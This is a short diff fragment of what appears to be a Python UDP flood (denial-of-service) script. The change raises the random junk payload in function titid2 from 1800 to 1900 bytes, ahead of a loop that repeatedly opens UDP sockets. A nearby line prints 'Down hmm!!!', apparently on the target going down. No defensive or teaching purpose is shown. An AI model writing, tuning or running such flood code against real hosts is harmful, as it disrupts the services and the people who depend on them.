@@ -25,7 +25,7 @@ def titid():
             print("Down hmm!!!")
 
 def titid2():
-    pepek = random._urandom(1800)
+    pepek = random._urandom(1900)
     while True:
         try:
             s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
